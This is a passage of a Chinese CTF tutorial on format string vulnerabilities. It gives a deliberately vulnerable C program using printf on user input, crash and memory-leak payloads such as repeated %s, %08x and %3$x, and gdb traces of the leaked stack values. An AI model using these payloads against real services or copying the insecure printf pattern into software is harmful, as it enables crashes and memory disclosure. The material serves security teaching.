            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\n\n\n\u5176\u5b9e\uff0c\u5728\u4e0a\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5c55\u793a\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u4e24\u4e2a\u5229\u7528\u624b\u6bb5\n\n\n\n\n\u4f7f\u7a0b\u5e8f\u5d29\u6e83\uff0c\u56e0\u4e3a%s\u5bf9\u5e94\u7684\u53c2\u6570\u5730\u5740\u4e0d\u5408\u6cd5\u7684\u6982\u7387\u6bd4\u8f83\u5927\u3002\n\n\n\u67e5\u770b\u8fdb\u7a0b\u5185\u5bb9\uff0c\u6839\u636e%d\uff0c%f\u8f93\u51fa\u4e86\u6808\u4e0a\u7684\u5185\u5bb9\u3002\n\n\n\n\n\u4e0b\u9762\u6211\u4eec\u4f1a\u5bf9\u4e8e\u6bcf\u4e00\u65b9\u9762\u8fdb\u884c\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u91ca\u3002\n\n\n\u7a0b\u5e8f\u5d29\u6e83\n\n\n\u901a\u5e38\u6765\u8bf4\uff0c\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u662f\u6700\u4e3a\u7b80\u5355\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165\u82e5\u5e72\u4e2a%s\u5373\u53ef\n\n\n%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n\n\n\n\n\u8fd9\u662f\u56e0\u4e3a\u6808\u4e0a\u4e0d\u53ef\u80fd\u6bcf\u4e2a\u503c\u90fd\u5bf9\u5e94\u4e86\u5408\u6cd5\u7684\u5730\u5740\uff0c\u6240\u4ee5\u603b\u662f\u4f1a\u6709\u67d0\u4e2a\u5730\u5740\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u3002\u8fd9\u4e00\u5229\u7528\uff0c\u867d\u7136\u653b\u51fb\u8005\u672c\u8eab\u4f3c\u4e4e\u5e76\u4e0d\u80fd\u63a7\u5236\u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u6837\u5374\u53ef\u4ee5\u9020\u6210\u7a0b\u5e8f\u4e0d\u53ef\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u8fdc\u7a0b\u670d\u52a1\u6709\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u5176\u53ef\u7528\u6027\uff0c\u4f7f\u670d\u52a1\u5d29\u6e83\uff0c\u8fdb\u800c\u4f7f\u5f97\u7528\u6237\u4e0d\u80fd\u591f\u8bbf\u95ee\u3002\n\n\n\u6cc4\u9732\u5185\u5b58\n\n\n\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c\n\n\n\n\n\u6cc4\u9732\u6808\u5185\u5b58\n\n\n\u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c\n\n\n\u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58\n\n\n\n\n\n\n\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58\n\n\n\u5229\u7528GOT\u8868\u5f97\u5230libc\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83libc\u51fd\u6570\u5730\u5740\n\n\n\u76f2\u6253\uff0cdump\u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002\n\n\n\n\n\n\n\n\n\u6cc4\u9732\u6808\u5185\u5b58\n\n\n\u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f\n\n\n#include\n \nstdio.h\n\n\nint\n \nmain\n()\n \n{\n\n  \nchar\n \ns\n[\n100\n];\n\n  \nint\n \na\n \n=\n \n1\n,\n \nb\n \n=\n \n0x22222222\n,\n \nc\n \n=\n \n-\n1\n;\n\n  \nscanf\n(\n%s\n,\n \ns\n);\n\n  \nprintf\n(\n%08x.%08x.%08x.%s\n\\n\n,\n \na\n,\n \nb\n,\n \nc\n,\n \ns\n);\n\n  \nprintf\n(\ns\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u7136\u540e\uff0c\u6211\u4eec\u7b80\u5355\u7f16\u8bd1\u4e00\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 make\ngcc -fno-stack-protector -no-pie -o leakmemory leakmemory.c\nleakmemory.c: In \nfunction\n \u2018main\u2019:\nleakmemory.c:7:10: warning: format not a string literal and no format arguments \n[\n-Wformat-security\n]\n\n   printf\n(\ns\n)\n;\n\n          ^\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7f16\u8bd1\u5668\u6307\u51fa\u4e86\u6211\u4eec\u7684\u7a0b\u5e8f\u4e2d\u6ca1\u6709\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u7684\u95ee\u9898\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\uff0c\u5982\u4f55\u83b7\u53d6\u5bf9\u5e94\u7684\u6808\u5185\u5b58\u3002\n\n\n\u6839\u636eC\u8bed\u8a00\u7684\u8c03\u7528\u89c4\u5219\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4f1a\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f4\u63a5\u4f7f\u7528\u6808\u4e0a\u81ea\u9876\u5411\u4e0a\u7684\u53d8\u91cf\u4f5c\u4e3a\u5176\u53c2\u6570(64\u4f4d\u4f1a\u6839\u636e\u5176\u4f20\u53c2\u7684\u89c4\u5219\u8fdb\u884c\u83b7\u53d6)\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd32\u4f4d\u3002\n\n\n\u83b7\u53d6\u6808\u53d8\u91cf\u6570\u503c\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u83b7\u53d6\u6808\u4e0a\u53d8\u91cf\u7684\u6570\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u8bd5\u4e00\u4e0b\uff0c\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 ./leakmemory\n%08x.%08x.%08x\n\n00000001\n.22222222.ffffffff.%08x.%08x.%08x\nffcfc400.000000c2.f765a6bb\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86\u4e00\u4e9b\u5185\u5bb9\u3002\u4e3a\u4e86\u66f4\u52a0\u7ec6\u81f4\u7684\u89c2\u5bdf\uff0c\u6211\u4eec\u5229\u7528GDB\u6765\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4ee5\u4fbf\u4e8e\u9a8c\u8bc1\u6211\u4eec\u7684\u60f3\u6cd5\uff0c\u8fd9\u91cc\u5220\u9664\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u53ea\u5173\u6ce8\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6808\u3002\n\n\n\u9996\u5148\uff0c\u542f\u52a8\u7a0b\u5e8f\uff0c\u5c06\u65ad\u70b9\u4e0b\u8f7dprintf\u51fd\u6570\u5904\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 gdb leakmemory\ngef\u27a4  b \nprintf\n\nBreakpoint \n1\n at 0x8048330\n\n\n\n\n\u4e4b\u540e\uff0c\u8fd0\u884c\u7a0b\u5e8f\n\n\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n%08x.%08x.%08x\n\n\n\n\n\u6b64\u65f6\uff0c\u7a0b\u5e8f\u7b49\u5f85\u6211\u4eec\u7684\u8f93\u5165\uff0c\u8fd9\u65f6\u6211\u4eec\u8f93\u5165%08x.%08x.%08x\uff0c\u7136\u540e\u6572\u51fb\u56de\u8f66\uff0c\u662f\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u9996\u5148\u65ad\u5728\u4e86\u7b2c\u4e00\u6b21\u8c03\u7528printf\u51fd\u6570\u7684\u4f4d\u7f6e\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0x8048563 \n%08x.%08x.%08x.%s\\n\n)\n at printf.c:28\n\n28\n  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret\n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccec\n, \nl8\n]\n\n\n8\n\n0xffffccec\u2502+0x00: 0x080484bf  \u2192  \nmain+84\n add esp, 0x20     \u2190 \n$esp\n\n0xffffccf0\u2502+0x04: 0x08048563  \u2192  \n%08x.%08x.%08x.%s\n\n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192  \n%08x.%08x.%08x\n\n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192  \n%08x.%08x.%08x\n\n0xffffcd08\u2502+0x1c: 0x000000c2\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u65f6\u6b64\u65f6\u5df2\u7ecf\u8fdb\u5165\u4e86printf\u51fd\u6570\u4e2d\uff0c\u6808\u4e2d\u7b2c\u4e00\u4e2a\u53d8\u91cf\u4e3a\u8fd4\u56de\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u7b2c\u4e09\u4e2a\u53d8\u91cf\u4e3aa\u7684\u503c\uff0c\u7b2c\u56db\u4e2a\u53d8\u91cf\u4e3ab\u7684\u503c\uff0c\u7b2c\u4e94\u4e2a\u53d8\u91cf\u4e3ac\u7684\u503c\uff0c\u7b2c\u516d\u4e2a\u53d8\u91cf\u4e3a\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002\u7ee7\u7eed\u8fd0\u884c\u7a0b\u5e8f\n\n\ngef\u27a4  c\nContinuing.\n\n00000001\n.22222222.ffffffff.%08x.%08x.%08x\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u8f93\u51fa\u4e86\u6bcf\u4e00\u4e2a\u53d8\u91cf\u5bf9\u5e94\u7684\u6570\u503c\uff0c\u5e76\u4e14\u65ad\u5728\u4e86\u4e0b\u4e00\u4e2aprintf\u5904\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0xffffcd10 \n%08x.%08x.%08x\n)\n at printf.c:28\n\n28\n  in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret\n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  \n%08x.%08x.%08x\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  \n%08x.%08x.%08x\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: \n%08x.%08x.%08x\n   \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: \n.%08x.%08x\n\n0xffffcd18\u2502+0x1c: \nx.%08x\n\n\n\n\n\n\u6b64\u65f6\uff0c\u7531\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a%x%x%x\uff0c\u6240\u4ee5\uff0c\u7a0b\u5e8f \u4f1a\u5c06\u6808\u4e0a\u76840xffffcd04\u53ca\u5176\u4e4b\u540e\u7684\u6570\u503c\u5206\u522b\u4f5c\u4e3a\u7b2c\u4e00\uff0c\u7b2c\u4e8c\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u6309\u7167int\u578b\u8fdb\u884c\u89e3\u6790\uff0c\u5206\u522b\u8f93\u51fa\u3002\u7ee7\u7eed\u8fd0\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\u53bb\uff0c\u786e\u5b9e\u548c\u60f3\u8c61\u4e2d\u7684\u4e00\u6837\u3002\n\n\ngef\u27a4  c\nContinuing.\nffffcd10.000000c2.f7e8b6bb\n[\nInferior \n1\n \n(\nprocess \n57077\n)\n exited normally\n]\n\n\n\n\n\n\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528%p\u6765\u83b7\u53d6\u6570\u636e\uff0c\u5982\u4e0b\n\n\n%\np\n.%\np\n.%\np\n\n\n00000001.22222222\n.\nffffffff\n.%\np\n.%\np\n.%\np\n\n\n0xfff328c0\n.\n0xc2\n.\n0xf75c46bb\n\n\n\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6bcf\u6b21\u5f97\u5230\u7684\u7ed3\u679c\u90fd\u4e00\u6837 \uff0c\u56e0\u4e3a\u6808\u4e0a\u7684\u6570\u636e\u4f1a\u56e0\u4e3a\u6bcf\u6b21\u5206\u914d\u7684\u5185\u5b58\u9875\u4e0d\u540c\u800c\u6709\u6240\u4e0d\u540c\uff0c\u8fd9\u662f\u56e0\u4e3a\u6808\u662f\u4e0d\u5bf9\u5185\u5b58\u9875\u505a\u521d\u59cb\u5316\u7684\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u4e0a\u9762\u7ed9\u51fa\u7684\u65b9\u6cd5\uff0c\u90fd\u662f\u4f9d\u6b21\u83b7\u5f97\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u6808\u4e2d\u88ab\u89c6\u4e3a\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u503c\u5462\n\uff1f\u80af\u5b9a\u662f\u53ef\u4ee5\u7684\u5566\u3002\u65b9\u6cd5\u5982\u4e0b\n\n\n%n$x\n\n\n\n\n\u5229\u7528\u5982\u4e0b\u7684\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u6570\u503c\u3002\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u8981\u8bf4\u662f\u5bf9\u5e94\u7b2cn+1\u4e2a\u53c2\u6570\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u53c2\u6570\u91cc\u9762\u7684n\u6307\u7684\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u7b2cn\u4e2a\u8f93\u51fa\u53c2\u6570\uff0c\u90a3\u76f8\u5bf9\u4e8e\u8f93\u51fa\u51fd\u6570\u6765\u8bf4\uff0c\u5c31\u662f\u7b2cn+1\u4e2a\u53c2\u6570\u4e86\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u4ee5gdb\u8c03\u8bd5\u4e00\u4e0b\u3002\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 gdb leakmemory\ngef\u27a4  b \nprintf\n\nBreakpoint \n1\n at 0x8048330\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n%3\n$x\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0x8048563 \n%08x.%08x.%08x.%s\\n\n)\n at printf.c:28\n\n28\n  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret\n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccec\n, \nl8\n]\n\n\n8\n\n0xffffccec\u2502+0x00: 0x080484bf  \u2192  \nmain+84\n add esp, 0x20     \u2190 \n$esp\n\n0xffffccf0\u2502+0x04: 0x08048563  \u2192  \n%08x.%08x.%08x.%s\n\n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192  \n%3\n$x\n\n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192  \n%3\n$x\n\n0xffffcd08\u2502+0x1c: 0x000000c2\ngef\u27a4  c\nContinuing.\n\n00000001\n.22222222.ffffffff.%3\n$x\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0xffffcd10 \n%3\n$x\n)\n at printf.c:28\n\n28\n  in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret\n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  \n%3\n$x\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  \n%3\n$x\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: \n%3\n$x\n     \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: 0xffffce00  \u2192  0x00000001\n0xffffcd18\u2502+0x1c: 0x000000e0\ngef\u27a4  c\nContinuing.\nf7e8b6bb\n[\nInferior \n1\n \n(\nprocess \n57442\n)\n exited normally\n]\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u786e\u5b9e\u83b7\u5f97\u4e86printf\u7684\u7b2c4\u4e2a\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u503cf7e8b6bb\u3002\n\n\n\u83b7\u53d6\u6808\u53d8\u91cf\u5bf9\u5e94\u5b57\u7b26\u4e32\n\n\n\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u5f97\u6808\u53d8\u91cf\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u9700\u8981\u7528\u5230%s\u4e86\u3002\u8fd9\u91cc\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u8fdb\u884cgdb\u8c03\u8bd5\uff0c\u5982\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 gdb leakmemory\ngef\u27a4  b \nprintf\n\nBreakpoint \n1\n at 0x8048330\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n%s\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0x8048563 \n%08x.%08x.%08x.%s\\n\n)\n at printf.c:28\n\n28\n  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret\n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccec\n, \nl8\n]\n\n\n8\n\n0xffffccec\u2502+0x00: 0x080484bf  \u2192  \nmain+84\n add esp, 0x20     \u2190 \n$esp\n\n0xffffccf0\u2502+0x04: 0x08048563  \u2192  \n%08x.%08x.%08x.%s\n\n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd08\u2502+0x1c: 0x000000c2\ngef\u27a4  c\nContinuing.\n\n00000001\n.22222222.ffffffff.%s\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0xffffcd10 \n%s\n)\n at printf.c:28\n\n28\n  in 